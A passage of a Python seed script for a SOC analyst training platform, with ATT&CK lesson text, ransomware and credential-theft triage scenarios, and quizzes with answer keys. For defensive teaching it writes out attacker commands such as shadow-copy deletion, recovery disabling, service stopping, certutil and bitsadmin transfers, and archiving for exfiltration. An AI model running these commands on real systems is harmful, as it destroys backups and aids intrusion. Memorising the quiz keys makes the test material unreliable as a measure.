- **.003 DCOM** — `MMC20.Application`, `ShellWindows`, `ShellBrowserWindow` objects abused for remote execution.
- **.004 SSH** — `sshd` accepting password auth where keys are policy.
- **.005 VNC** — port 5900.
- **.006 WinRM** — port 5985/5986; `Enter-PSSession`, `Invoke-Command`. **EID 4624 with logon process `WinRM`** is the giveaway.

### T1570 Lateral Tool Transfer

Copying tooling between hosts after initial pivot — `copy` to `\\\\host\\C$\\Users\\Public\\…`, `bitsadmin /transfer`, `certutil -urlcache`.

### T1550 Use Alternate Authentication Material

- **.002 Pass-the-Hash** — NTLM hash reused without plaintext password. **EID 4624 NTLM with LT9 / LT3** from a non-DC source against an admin account is a strong signal.
- **.003 Pass-the-Ticket** — Kerberos TGT/TGS reuse.

### T1210 Exploitation of Remote Services

EternalBlue (MS17-010), ProxyShell (Exchange), ZeroLogon (CVE-2020-1472), PrintNightmare.

## Collection / Exfiltration / Impact (TA0009 / TA0010 / TA0040)

### Collection

- **T1005 Data from Local System** — recursive directory crawl + selective copy.
- **T1114 Email Collection** — Module 6's inbox-rule exfil pattern (`.003 Email Forwarding Rule`).
- **T1213 Data from Information Repositories** — SharePoint / Confluence / Teams / Jira.
- **T1560.001 Archive Collected Data: with Utility** — `rar a -hp<password> out.rar C:\\target`, `7z a -p`, `Compress-Archive`. Signal: a rarely-seen utility archiving from Documents/Desktop/share into `%TEMP%` or `C:\\PerfLogs`.

### Exfiltration

- **T1041 Exfiltration Over C2 Channel** — exfil rides the C2 path.
- **T1567.002 Exfiltration Over Web Service: Cloud Storage** — Mega, Dropbox, OneDrive, Google Drive, Discord CDN, transfer.sh, anonfiles, file.io, gofile.io. Fingerprint: `destination.domain` matches a public-file-host list AND `network.bytes` outbound is large.
- **T1048 Exfiltration Over Alternative Protocol** — DNS, ICMP tunnel, raw FTP/SMB.

### Impact — ransomware behaviour

- **T1486 Data Encrypted for Impact** — the encryption phase. Signals: high CPU on cryptographic primitives, mass file-renaming with extension change, ransom-note files in every directory.
- **T1490 Inhibit System Recovery** — `vssadmin delete shadows /all /quiet`, `wbadmin delete catalog -quiet`, `bcdedit /set {default} bootstatuspolicy ignoreallfailures`, `bcdedit /set {default} recoveryenabled No`. **The highest-priority L1 alert in this dossier.** Encryption is minutes away.
- **T1485 Data Destruction** — wiper malware (NotPetya, HermeticWiper, IsaacWiper); cloud-bucket purge.
- **T1489 Service Stop** — `net stop` / `Stop-Service` flurries against backup-related and database service names.

## Command and Control (TA0011)

- **T1071 Application Layer Protocol** — **.001 Web**, **.002 File Transfer**, **.003 Mail**, **.004 DNS**.
- **T1573.002 Encrypted Channel: Asymmetric Cryptography (TLS)** — almost every modern C2 today.
- **T1090 Proxy** — **.001 Internal**, **.002 External**, **.003 Multi-hop** (Tor / I2P), **.004 Domain Fronting**.
- **T1568.002 Dynamic Resolution: DGA**.
- **T1102 Web Service** — abuse of legitimate services as dead-drops or live channels: GitHub Pages, Discord webhooks, Cloudflare Workers, Telegram, Pastebin, Slack workspaces, Notion. Hard to detect — destinations are *legitimately reachable* for everyone.
- **T1572 Protocol Tunneling** — DNS / ICMP / SSH tunnelling.
- **T1219 Remote Access Software** — **AnyDesk, ScreenConnect, TeamViewer, Atera, Splashtop, NetSupport, Action1, Tactical RMM**. Ransomware affiliates install these specifically because they're allow-listed.

### "Beacon shape" in practice

- **Periodicity** — packets to one destination at near-constant intervals (e.g. every 60 s ± 10 s jitter).
- **Size symmetry** — outbound POSTs clustered around a small range (heartbeat); inbound mostly small with occasional larger responses (tasking).
- **Working-hours-agnostic** — beacons don't take weekends off.
- **Sparse hostname diversity** — one host visiting one rare domain hundreds of times per day.

Module 4 covered the detection mechanics; the ATT&CK lens is to recognise this as **T1071.001 + T1573.002** when HTTPS, **T1071.004 + T1572** when DNS-tunnelled, or **T1102** when the destination is a legitimate SaaS surface.

## The modal ransomware-affiliate chain

```mermaid
flowchart LR
    IA[Initial Access<br/>T1566 / T1078 / T1190] --> EX[Execution<br/>T1059.001]
    EX --> CR[Cred Access<br/>T1003.001 + T1110]
    CR --> LM[Lateral<br/>T1021.001 / .002 + T1550.002]
    LM --> DI[Discovery<br/>T1087/T1018/T1482/T1069]
    DI --> PE[Persistence<br/>T1543.003 + T1219 RMM]
    PE --> DE[Defense Evasion<br/>T1562.001 + T1070.001]
    DE --> IM[Impact<br/>T1490 then T1489 then T1486]
```

**Dwell-time compression matters.** Median dwell across major IR-retainer reports has compressed from late-2010s figures of 60–90 days to 2023–2024 medians of around **5–10 days**, with some affiliates going from initial access to encryption in **under 24 hours**. *"Dwell is short"* is the L1's mental prior. An alert that *looks like* an early step in the chain should not be deferred.

When an alert lands, position it in the chain with three questions:

1. **What's likely behind this?** What earlier-stage techniques would plausibly precede this alert?
2. **What's likely ahead of this?** What follow-on techniques does this alert make probable?
3. **How loud is the rest of the operator's expected behaviour?** Quiet follow-ons (T1219 RMM install) demand *pre-emptive* containment because you may not detect them once they fire.

## The modal cloud-incident chain

```mermaid
flowchart LR
    A[T1566.002<br/>phishing link] --> B[T1539<br/>cookie theft AiTM]
    B --> C[T1078.004<br/>cloud sign-in]
    C --> D[T1098.005<br/>device registration]
    D --> E[T1098.001 / .003<br/>add OAuth secret / role]
    E --> F[T1114.003 + T1213<br/>inbox rule + SharePoint pull]
    F --> G[T1567.002<br/>exfil to cloud storage]
```

Same shape as on-prem (foothold → persistence → privilege → discovery → collection → exfil), different telemetry plane. Primary surfaces: **Entra Sign-In Logs**, **Entra Audit Logs**, **Microsoft Graph Activity Logs**, **Defender for Cloud Apps**, **AWS CloudTrail**, **GCP Admin Activity**.

## ION-specific conventions

- **AlertPromptTemplate matcher tier 3 (technique) + tier 4 (tactic)** — when `rule_id` and regex don't match, ION matches LLM prompt templates by **technique ID** then **tactic ID**. A *wrong* tactic at tier 4 sends a poorly-fitted prompt to Bob, weakening the verdict the analyst reads.
- **Case taxonomy carries technique IDs** — every escalation packet (Module 7) propagates the technique mapping. Wrong technique = wrong propagation through the entire incident record.
- **Bob's verdict cites technique IDs** — *"observed `vssadmin delete shadows` is consistent with T1490 Inhibit System Recovery, typically immediately preceding T1486"*. Read these fluently.
- **Case similarity (pgvector)** — `/cases/{id}/similar` clusters by embedding *and* technique tag. Mis-tagged techniques fragment the cluster.

## Worked scenario A — Discovery-cluster fingerprint

**Alert:** *Process Discovery Cluster — 4 commands within 70 s on WORKSTATION-7.*

```text
2026-04-15T09:14:02Z  WORKSTATION-7  user: jsmith  cmd.exe  whoami
2026-04-15T09:14:18Z  WORKSTATION-7  user: jsmith  cmd.exe  net group "Domain Admins" /domain
2026-04-15T09:14:42Z  WORKSTATION-7  user: jsmith  cmd.exe  nltest /domain_trusts
2026-04-15T09:15:11Z  WORKSTATION-7  user: jsmith  cmd.exe  net view /domain
```

**ATT&CK:** **T1033** + **T1069.002** + **T1482** + **T1018**.

**L1 reasoning.** No single command is alarming. The *cluster within ~70 s* is. A user does not run `nltest /domain_trusts` from a workstation as part of normal work. This pattern matches the first 60 s after a foothold.

**Action.** Pivot 30 min before for parent process. Pivot 30 min after for any T1003 / T1021. Escalate per Module 7's *behavioural cluster* criterion. Engage the user out-of-band to confirm context (do not alert by email if compromise is suspected).

## Worked scenario B — LSASS read → DCSync chain

**Alert 1 (T+0):** Defender — *Suspicious access to LSASS by Mimikatz-like signature* on `WORKSTATION-7`. Sysmon EID 10: `procdump.exe` accessing `lsass.exe` with granted-access `0x1F0FFF`. **ATT&CK: T1003.001.**

**L1 pivot — same user/host, next 30 min:**

- 4624 LT3/LT9 NTLM events from `WORKSTATION-7` against admin accounts → Pass-the-Hash (T1550.002).
- 4769 Kerberos TGS bursts → forged-ticket usage (T1558).
- 4662 with the replication GUID → DCSync (T1003.006).

**Alert 2 (T+18 min):** EID 4662 on `DC01` — `Object Type: domainDNS`, `Properties: {DS-Replication-Get-Changes-All}`, `Account Name: svc-backup`, `Source: WORKSTATION-7`. **ATT&CK: T1003.006.** The `svc-backup` hash dumped in step 1 is now replicating domain credentials.

**Action.** *Page everyone.* Isolate `WORKSTATION-7` (Defender Live Response: `Isolate-Machine`). Disable `svc-backup`. Page IR. Do not wait for further alerts — the operator is one step from Tier-0 control of the domain.

```mermaid
flowchart LR
    A[T+0: LSASS read<br/>T1003.001<br/>WORKSTATION-7] --> B[T+18: 4662 DCSync<br/>T1003.006<br/>DC01 ← WORKSTATION-7]
    B --> C{L1 decision}
    C --> D[Isolate WORKSTATION-7]
    C --> E[Disable svc-backup]
    C --> F[Page IR]
```

## Worked scenario C — Ransomware staging

**Alert (T+0):** EDR — *vssadmin used to delete shadow copies* on `FILESERVER-02`.

```text
ParentImage:    C:\\Windows\\System32\\cmd.exe
Image:          C:\\Windows\\System32\\vssadmin.exe
CommandLine:    vssadmin.exe delete shadows /all /quiet
User:           NT AUTHORITY\\SYSTEM
IntegrityLevel: System
```

**Pivot — same host, prior 10 min:**

```text
T-08m  cmd.exe  ←  payload.exe (entropy 7.9, signed: no)
T-07m  vssadmin.exe delete shadows /all /quiet              [T1490]
T-07m  wbadmin.exe delete catalog -quiet                    [T1490]
T-06m  bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures   [T1490]
T-06m  bcdedit.exe /set {default} recoveryenabled No        [T1490]
T-05m  net.exe stop "MSSQLSERVER"                            [T1489]
T-05m  net.exe stop "Veeam Backup Service"                   [T1489]
T-04m  net.exe stop "BackupExecAgentAccelerator"             [T1489]
T-03m  taskkill.exe /F /IM "sqlservr.exe"                    [T1489]
```

**ATT&CK:** **T1490** (multiple) + **T1489** (multiple). Predicted next: **T1486** (mass encryption).

**Time pressure.** From `vssadmin delete shadows` to first ransom note is typically **2–10 minutes** on a fileserver. *There is no such thing as "monitoring" this alert; only acting on it.*

**Action.** Network-isolate the host now. Page IR. Begin notifying owners of every business-critical share on the fileserver. Do not wait to enrich.

## Common L1 ATT&CK-mapping mistakes

1. **Citing the parent technique when a sub-technique fits.** `T1059` instead of `T1059.001` — drops precision for ION's matcher tier 3 and case similarity. *Cite the sub-tech when the artefact tells you which interpreter.*
2. **Pinning a group / cluster name from a procedure example.** Cluster attribution rotates between vendors. *Cite the technique. Let case-similarity and Bob suggest cluster context.*
3. **Treating any one discovery command as high-severity.** A single `whoami` is not the signal. *Pivot for the cluster window.*
4. **Treating any discovery cluster as low-severity.** Domain-trust + Domain-Admin enumeration on a workstation is a strong post-foothold signal regardless of clustering volume. *Content matters, not just count.*
5. **Mis-classifying T1490 as 'monitor'.** `vssadmin delete shadows` is *not* a monitor alert — encryption is minutes away.
6. **Confusing process-injection alerts with privilege escalation.** T1055 is primarily defense evasion. Look at integrity-level differential before tagging the tactic.
7. **Tagging cloud activity with on-prem technique parents.** T1078 instead of T1078.004 fragments the case-similarity index. *Verify the platform list at the top of the technique page.*
8. **Reading 'Detection' patterns as 'must-match' rather than 'may-match'.** ATT&CK's Detection section gives illustrative analytic patterns. The technique is defined by *behaviour*, not by a specific command-line.

## Glossary

- **Modal ransomware chain** — IA → execution → cred access → lateral → discovery → persistence → evasion → impact (T1490 → T1489 → T1486).
- **Modal cloud-takeover chain** — phish → AiTM → cloud sign-in → device-reg → role/secret → mailbox/SharePoint → exfil.
- **Page-everyone alerts** — T1490, T1003.006 with replication GUID, T1486 mass file rename.
- **Pre-emptive containment** — when the predicted next step in the chain is *quiet* (T1219 RMM install), don't wait for the next alert.

## Further reading

- Mandiant *M-Trends*, CrowdStrike *Threat Hunting Report*, Sophos *Active Adversary Report* — annual dwell-time medians and chain shape.
- Red Canary *Threat Detection Report* — empirical "most-seen" technique chart.
- MITRE Engenuity Center for Threat-Informed Defense — top-techniques calculator.
""",
    )
    m8l4q = _add_lesson(
        session, mod8, order=8, title="Lateral, Impact, C2 & ION — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on T1490 ransomware staging urgency, the cloud chain mapping, ION matcher tiers 3-4, and the WinRM logon-process fingerprint.",
    )
    _add_q(session, m8l4q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An EDR alert fires on a fileserver: *'vssadmin used to delete shadow copies'* — `vssadmin.exe delete shadows /all /quiet` running as `NT AUTHORITY\\SYSTEM`. Within the prior 10 minutes, the same host shows `wbadmin delete catalog`, `bcdedit recoveryenabled No`, and `net stop MSSQLSERVER`. What is the correct L1 disposition?",
        options=[
            {"value": "monitor", "label": "Tag as T1490 informational, queue for follow-up next shift"},
            {"value": "fp", "label": "Close as likely Veeam-class backup-tool false positive after a 30-minute review"},
            {"value": "page", "label": "Network-isolate the host immediately, page IR, notify owners of business-critical shares — encryption (T1486) is minutes away"},
            {"value": "user_check", "label": "Email the user / system owner asking whether they recently ran a maintenance script"},
        ],
        correct="page",
        explanation_md="`vssadmin delete shadows` + `wbadmin delete catalog` + `bcdedit recoveryenabled No` + backup-service stops is the textbook T1490 / T1489 staging chain. From this signal to first ransom note is typically 2–10 minutes. There is no such thing as *monitoring* this alert — isolate, page IR, notify owners. Speed matters.",
        points=2,
    )
    _add_q(session, m8l4q, order=2, kind=QuestionKind.MULTI,
        stem_md="Map the modal **cloud-takeover** chain: phish → AiTM cookie theft → cloud sign-in → device registration → secret/role addition → inbox rule + SharePoint pull → exfil. Which technique IDs *correctly* map to those phases?",
        options=[
            {"value": "t1566", "label": "T1566.002 → T1539 → T1078.004 → T1098.005 → T1098.001 / .003 → T1114.003 + T1213 → T1567.002"},
            {"value": "t1078", "label": "T1078 (parent only) for every cloud sign-in step"},
            {"value": "t1003", "label": "T1003.001 LSASS Memory for the cloud sign-in step"},
            {"value": "t1485", "label": "T1485 Data Destruction for the exfil step"},
            {"value": "t1486", "label": "T1486 Data Encrypted for Impact for the exfil step"},
        ],
        correct=["t1566"],
        explanation_md="Only the first option correctly maps the chain. Cloud sign-in is T1078.004 *(Cloud Accounts sub-tech)*, not T1078 parent. T1003.001 is on-prem LSASS dumping. T1485 is data destruction (cloud bucket delete) — different from exfiltration. T1486 is ransomware encryption — also unrelated to BEC exfil.",
        points=3,
    )
    _add_q(session, m8l4q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="In ION's 5-tier AlertPromptTemplate matcher (rule_id → regex → MITRE technique → MITRE tactic → groups), citing the wrong tactic at tier 4 sends a poorly-fitted prompt to Bob and weakens the verdict the analyst reads.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** Tier 4 (tactic) is the fallback when neither `rule_id`, regex, nor technique-ID matches. A wrong tactic ID sends Bob a prompt template tuned for a different adversary phase — wrong context produces a wrong verdict. Correctly classifying the technique on novel alerts is operationally load-bearing for the AI-analyst pipeline.",
        points=2,
    )
    _add_q(session, m8l4q, order=4, kind=QuestionKind.SHORTANSWER,
        stem_md="A Windows Event 4624 successful logon record arrives showing the **logon process** field set to `WinRM`, with logon type 3, sourced from another workstation. Which ATT&CK sub-technique does this most precisely fingerprint? Give the T-number plus a short technique-name (or just the T-number).",
        options=None,
        correct=["T1021.006", "t1021.006", "T1021.006 winrm", "T1021.006 windows remote management", "1021.006"],
        explanation_md="**T1021.006** Remote Services: Windows Remote Management. EID 4624 with the `WinRM` logon process is the canonical signal — `Enter-PSSession` / `Invoke-Command` ride this. Ports 5985 (HTTP) / 5986 (HTTPS).",
        points=2,
    )

    print(f"  L1: {course.title} — 8 modules, 59 lessons (Module 8 Common ATT&CK Techniques @ proper depth — L1 COMPLETE)")
    return course


# ── L2 — Threat Hunting with KQL ─────────────────────────────────────────


def _seed_l2(session: Session, author_id: int) -> Course:
    course = _add_course(
        session,
        slug="demo-l2-threat-hunting-with-kql",
        title="Threat Hunting with KQL",
        level=CourseLevel.L2,
        description_md=(
            "Hypothesis-driven threat hunting with Kibana Query Language. Where L1 reacts "
            "to detections that fired, L2 *looks for the threats no rule has caught yet*. "
            "This course covers building a hunt hypothesis, expressing it as a KQL query, "
            "iterating on results, and converting a successful hunt into a permanent "
            "detection.\n\n"
            "**Prerequisites:** L1 Alert Triage Fundamentals.\n\n"
            "**By the end you'll be able to:**\n\n"
            "- Frame an actionable hunt hypothesis (PEAK / SURGe-style)\n"
            "- Translate the hypothesis to KQL across host, network, and identity data\n"
            "- Reduce noise without losing signal — pivot from broad to narrow\n"
            "- Convert a one-off hunt into a TIDE detection rule with a tuning recommendation\n"
        ),
        estimated_hours=3,
        order_in_level=1,
        skill_keys=["threat-hunting", "kql-spl", "detection-engineering"],
        author_id=author_id,
    )
    mod = _add_module(
        session, course, order=1, title="The Hunt Hypothesis: PEAK methodology",
        description_md=(
            "L2 finale-grade methodology module. Why hunting is structurally "
            "necessary; the PEAK loop end-to-end (Prepare → Execute → Act → "
            "Know) with explicit time-budgeting; the four-element + SMART "
            "hypothesis template; the negative-result discipline and the "
            "confidence-on-absence statement; converting a successful hunt "
            "to a TIDE detection rule; ATT&CK Navigator coverage states; "
            "ION-specific surfaces (hunt-tagged cases, AlertPromptTemplate "
            "matcher tier 2/3, Bob's hunt-derived reasoning, hunt repository); "
            "a worked T1218.011 Rundll32-javascript hunt walked end-to-end."
        ),
        estimated_minutes=210,
    )

    # Lesson 1.1 — Why hunt? Strategic frame
    l1 = _add_lesson(
        session, mod, order=1, title="Why hunt? The strategic frame",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Articulate why detection-only SOCs are structurally blind to anything outside their rule corpus, and how hunting fills that gap
> 2. Cite the dwell-time problem with current-year medians and explain why the *long-tail* matters more than the median
> 3. Apply CTID's *threat-informed defence* doctrine — hunt the techniques the adversaries that target your sector actually use
> 4. Reframe the *Pyramid of Pain* as a hunting priority surface (top three layers, not bottom)
> 5. Distinguish *hunt* from *incident response* and from *detection engineering* on five structural axes
> 6. Place a SOC on the **Hunting Maturity Model** (HM0 → HM4) and identify what moves between tiers
>
> **Prerequisites.** L1 *Alert Triage Fundamentals* completed. Comfort reading KQL or SPL queries. Recognition of ATT&CK technique IDs by sight.

## Detection alone isn't enough

Every SOC's detection layer — SIEM correlation rules, EDR analytics, NDR signatures, identity-provider risk policies — can only catch threats the team has already conceived of and engineered a rule for. That's the central limitation: **a detection rule is a hypothesis frozen in code.** Once written, it fires on the patterns it was authored to fire on, and it is silent on everything else.

L1 analysts work entirely *inside* the boundary of what has fired. Their queue is whatever the rules emit. Their job is high-throughput triage of a finite, known set of detection signatures.

L2 hunters work *outside* that boundary. The hunt's purpose is to look for adversary behaviour that no rule has caught yet — either because the rule doesn't exist, the rule was tuned away, the rule fires too noisily and was disabled, or the adversary's tradecraft is novel enough that it slipped through the analytics. Concretely, hunting:

- **Surfaces gaps in detection coverage** before a real adversary exploits them. Every gap is a free attack path until someone writes a rule.
- **Converts gaps into permanent detection rules** (closing the loop — Lesson 4 covers this).
- **Builds analyst muscle memory** for the long-tail of ATT&CK techniques that don't fire frequently. An L1 who has only ever seen `T1059.001 PowerShell` from rule firings has weaker pattern recognition than an L2 who has hunted T1218 sub-techniques across 30 days of process-event data.
- **Provides defensible data points the CISO uses at year-end review.** *"We hunted these 27 techniques in Q3. Here's our coverage layer. Here are the four detection rules born from those hunts."*

A common misreading: that hunting exists because the detection team is *bad at their job* — that if the rules were better, hunts would be redundant. This is wrong in a structural way. Detection rules are necessarily *backward-looking*: they encode patterns that have already been observed somewhere. The space of possible adversary behaviours is open; the space of rules in production is closed and finite. No matter how skilled the detection team, the gap between those two spaces is the working surface of the hunting team. **Detection and hunting are complementary, not competing.**

The corollary the L2 should internalise: *every successful hunt is evidence the SOC is healthy*, not evidence the detection team failed. A SOC that runs a hunt against a technique and finds an active intrusion has discovered a real adversary that the detection layer didn't catch — but it has *also* discovered that its hunting layer works. Two pieces of good news, not one of each.

## The dwell-time problem

*Dwell time* is the interval between an adversary's initial access and the defender's discovery of the intrusion. It is the single most important metric for understanding *why* hunting matters.

The trend across the major incident-response retainer reports has been compression — and not because defenders are getting faster. Two effects move in opposite directions:

- **Median dwell across all intrusion classes has fallen** from late-2010s figures of 60–90 days to 2023–2024 medians around **5–10 days**. Mandiant's *M-Trends* documents the decade-long compression curve.
- **Median dwell for ransomware-class intrusions specifically is much shorter** — often well under **24 hours** from initial access to encryption deployment. CrowdStrike's *Threat Hunting Report* and Sophos's *Active Adversary Report* track this separately; eCrime *breakout time* (initial-host compromise → lateral movement) has been measured in tens of minutes for the most operationally mature intrusion sets.

The reason median dwell looks shorter is that **ransomware events self-disclose loudly when encryption fires.** The cases where dwell is short are visible. The cases where dwell is long — espionage-grade tradecraft, supply-chain access, identity-provider compromise — are *invisible until something else trips the rule*. **Hunting is the principal compensating control for the long-dwell cases that detection misses.**

The L2 hunter's working prior: *dwell is short when the adversary is loud, and long when the adversary is quiet, and the quiet ones are the ones a hunt is most likely to surface.*

A second nuance: **medians describe central tendency; the long-tail matters more.** A SOC that catches the median ransomware intrusion at day 3 looks competent in the headline metric, but the long-tail intrusion that sat for 240 days as a quiet credential-replay foothold is the one that loses the company a board-level remediation budget. Hunting is asymmetrically valuable on the long-tail because the long-tail is, by definition, the cases the rules didn't catch.

A third nuance specific to identity-tier intrusions: dwell on identity-provider compromises (Entra ID, Okta, Google Workspace) skews much longer than on endpoint-tier intrusions, because identity telemetry is sparser and the attack surface is administered, not detected. Hunts in `SignInLogs`, `AuditLogs`, and `IdentityLogonEvents` for techniques like T1078.004, T1098, and T1556.006 are the highest-leverage hunts a small SOC can run.

> Annual sources to track: Mandiant *M-Trends*; CrowdStrike *Global Threat Report* + *Threat Hunting Report*; Sophos *Active Adversary Report*; IBM/Verizon *Cost of a Data Breach* + *DBIR*. Numbers shift year-on-year — cite the most recent figure when reading.

## Threat-informed defence (CTID)

MITRE Engenuity's *Center for Threat-Informed Defense* (CTID) crystallised a doctrine: **defenders should align their detection content and hunting effort with the techniques the adversaries that target their sector actually use.** Hunting random techniques in the absence of a threat profile is wasted effort.

Two practical CTID artefacts the L2 should know:

- **The Top Techniques calculator** at `top-attack-techniques.mitre-engenuity.org` — given organisation context (sector, OS mix, telemetry, security controls), surfaces a ranked list of ATT&CK techniques most likely to matter. Useful as an input to the *Prepare* phase of PEAK.
- **The Adversary Emulation Library** — open-source emulation plans (FIN6, APT29, OilRig, etc.) describing the techniques and tooling for specific named adversaries. Suitable both for purple-team exercises and as templates for *threat-actor-based* hunts (Lesson 3).

The doctrine generalises: **don't hunt blind. Hunt informed.**

## The Pyramid of Pain — reframed for hunters

David Bianco's *Pyramid of Pain* (2013) was originally a triage taxonomy: where on the pyramid does this IOC sit? L1 analysts learned it that way in the IOC Handling module. The L2 hunter learns it as a **priority surface for hunting effort.**

```mermaid
graph BT
    A["Hash values<br/>(trivial — minutes)"] --> B["IP addresses<br/>(easy — hours)"]
    B --> C["Domain names<br/>(simple — days)"]
    C --> D["Network / host artefacts<br/>(annoying — weeks)"]
    D --> E["Tools<br/>(challenging — months)"]
    E --> F["TTPs<br/>(tough — years)"]
```

For triage, the bottom of the pyramid is fine — block a hash, block an IP. **For hunting, the priority inverts:**

- A hunt at the **hash level** is cheap to author and obsolete in a week. The adversary recompiles.
- A hunt at the **TTP level** is expensive to author (it requires understanding adversary *behaviour*, not just IOCs) but durable for years. Forcing TTP detection compels the adversary to *re-engineer their tradecraft* — the most expensive thing you can make them do.

L2 hunting effort therefore concentrates at the **top three layers** of the pyramid. Hash-level hunts are reserved for current-incident response, not general hunting.

The reframing has a practical implication for query authoring. A hash-level hunt query is one line — `where SHA256 in (list)`. A TTP-level hunt query is *the artefact of the hunt itself* — it captures the adversary behaviour as a pattern, often spanning multiple data sources, multiple events, and a temporal join. Harder to write, but it survives the adversary recompiling, re-hosting, and renaming. **The L2's craft is the ability to write TTP-level queries tight enough to be useful and loose enough to catch variants.**

## Hunt vs incident response vs detection engineering

These look superficially similar — a senior analyst running queries against telemetry — but they differ in five structural ways.

| Axis | Hunt | Incident Response | Detection Engineering |
|---|---|---|---|
| Trigger | Hypothesis | Alert / declared incident | Rule-authoring intent |
| Stance | Proactive | Reactive | Engineering |
| Disposition | Convert finding to FP-class, BTP-class, or *new* incident handed to IR | Close the existing incident | Ship a permanent rule |
| Timebox | Soft (PEAK time-budgets) | Hard (incident SLA, exec reporting) | Quarterly review |
| Output artefact | Hunt report (+ optional rule proposal) | Incident report + lessons-learned | Rule + lifecycle metadata |

```mermaid
graph TB
    subgraph "Proactive"
        H[Hunt<br/>hypothesis-driven<br/>exploratory queries<br/>output: hunt report]
    end
    subgraph "Reactive"
        I[Incident Response<br/>incident-driven<br/>containment & forensics<br/>output: incident report]
    end
    subgraph "Engineering"
        D[Detection Engineering<br/>rule-driven<br/>permanent detections<br/>output: rule + lifecycle]
    end

    H -.TPs hand off.-> I
    H -.successful hunts.-> D
    D -.alerts feed.-> I
```

The disposition rule matters: **when a hunt finds a true positive that warrants response, the hunt ends and an incident begins.** The hunter does not continue to "hunt on the incident" — that's IR's job, with chain-of-custody and containment workflows the hunt isn't structured for. The hunt report references the new incident ID and closes.

Two hunt-vs-DE failure modes the L2 must avoid:

- **Authoring detections during a hunt.** Tempting — the query is right there, surely just save it as a rule? But hunts run against historical data with the analyst's eye on every result; a permanent rule fires unattended and needs FP-rate measurement, whitelist, severity, runbook, owner. Lesson 4 covers the hand-off.
- **Hunting using detection-engineering metrics.** Hunts don't fail because they have a 10% FP rate; rules do. A hunt query with 100 results, manually triaged, that finds one TP is *a win*. Don't import DE quality bars into hunt-time.

The clean separation: **the hunt produces the *idea*; detection engineering produces the *rule*.** TIDE (or your DE pipeline) is the hand-off mechanism.

## The Hunting Maturity Model

David Bianco's *Hunting Maturity Model* (Sqrrl Data Inc., 2015) is the canonical maturity assessment. Five tiers:

```mermaid
graph TB
    HM4["HM4 — Leading<br/>Automates hunt-to-detect pipeline.<br/>Data-science-grade analytics.<br/>Informs the wider community."]
    HM3["HM3 — Innovative<br/>Authors original hunts with novel analytics.<br/>Converts successful hunts into detections."]
    HM2["HM2 — Procedural<br/>Follows public hunting playbooks (Sigma, threat-actor playbooks).<br/>Reuses, doesn't yet author."]
    HM1["HM1 — Minimal<br/>Routine threat-intel feeds; searches the env for IoCs.<br/>No hypothesis-driven hunts."]
    HM0["HM0 — Initial<br/>Reactive only.<br/>Relies on automated alerting.<br/>No hunting capability."]

    HM0 --> HM1 --> HM2 --> HM3 --> HM4
```

Most SOCs sit between HM1 and HM2. Moving to HM3 — *original* hunts with *novel* analytics, and a working pipeline to convert findings into detections — is what L2 hunters individually unblock. The skill differential between an HM2 SOC and an HM3 SOC is captured almost entirely in the L2's ability to (a) author strong hypotheses, (b) execute the PEAK loop, and (c) document negatives credibly.

## Why L2 hunting is the career-defining skill

L2 hunting is the inflection point in the analyst career arc. The L1 reacts. The L2 hunts. The IR analyst contains. The detection engineer codifies. The threat-intel analyst frames. **Hunting is the skill that builds the mental model for *all the downstream roles*** — IR (because hunters know what adversary behaviour looks like in raw telemetry), DE (because hunts feed DE), threat intel (because hunts test intel hypotheses), red team (because hunters know what to look for, and therefore what to hide). Investing in L2 hunting compounds across roles.

A second-order argument: the L1 queue is finite. The L2 hunt has no equivalent ceiling; the work expands to fill the depth of the analyst's curiosity and the breadth of the telemetry. By year two of an L2 role, a strong hunter is recognised not for ticket throughput but for the **detection-rule corpus they have authored, the data gaps they surfaced, and the techniques they took from red coverage to green.** That recognition is the visible portion of a career inflection that started invisibly in this module.

A third reason hunting matters is **epistemic hygiene.** L1 mode is *responsive* — the rule fires, the analyst checks the boxes. L2 hunt mode is *interrogative* — the analyst asks *"what would I expect to see if X were true?"* and writes the query. That shift from response to interrogation is the single most important cognitive move in the analyst career, and it generalises beyond security into incident management, ops engineering, and applied research. **PEAK is, structurally, a small applied-science loop.** Practising it builds a habit of mind that is portable.

## Glossary

- **Hunt vs Detection vs IR** — proactive (hypothesis) vs engineering (rule) vs reactive (incident).
- **Dwell time** — initial-access to discovery interval; medians are compressing but the long-tail is what matters.
- **Pyramid of Pain reframed** — for hunting, prioritise the *top* three layers (artefacts / tools / TTPs), not the bottom.
- **HMM HM0 → HM4** — Bianco's 5-tier maturity model. Most SOCs are HM1–HM2; L2 hunters individually unblock HM3.
- **Threat-informed defence** — CTID's doctrine: align hunts with the adversaries that target your sector.

## Further reading

- David Bianco, *Pyramid of Pain* (2013) and *Hunting Maturity Model* (Sqrrl, 2015).
- MITRE Engenuity CTID — Top Techniques calculator and Adversary Emulation Library.
- Mandiant *M-Trends*, CrowdStrike *Threat Hunting Report*, Sophos *Active Adversary Report* (annual).
""",
    )
    l1q = _add_lesson(
        session, mod, order=2, title="Why hunt? — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on the HMM tier-identification, hunt-vs-IR-vs-DE distinction, dwell-time long-tail reasoning, and the Pyramid of Pain reframed.",
    )
    _add_q(session, l1q, order=1, kind=QuestionKind.SINGLE,
        stem_md="A SOC follows public hunting playbooks (Sigma rules, threat-actor reports) and routinely searches its environment for indicators from CTI feeds, but has not yet authored an *original* hypothesis-driven hunt or converted a hunt into a permanent detection. Which Hunting Maturity Model tier best describes this SOC?",
        options=[
            {"value": "hm0", "label": "HM0 — Initial"},
            {"value": "hm1", "label": "HM1 — Minimal"},
            {"value": "hm2", "label": "HM2 — Procedural"},
            {"value": "hm3", "label": "HM3 — Innovative"},
            {"value": "hm4", "label": "HM4 — Leading"},
        ],
        correct="hm2",
        explanation_md="HM2 *Procedural* — follows public hunting playbooks (Sigma, threat-actor reports, ATT&CK Navigator layers) without yet authoring novel hunts. HM1 is feed-driven IoC search only; HM3 begins when the SOC authors *original* hunts with novel analytics and runs a working hunt-to-detection pipeline.",
        points=2,
    )
    _add_q(session, l1q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are *correct* statements about how hunting differs from incident response and detection engineering?",
        options=[
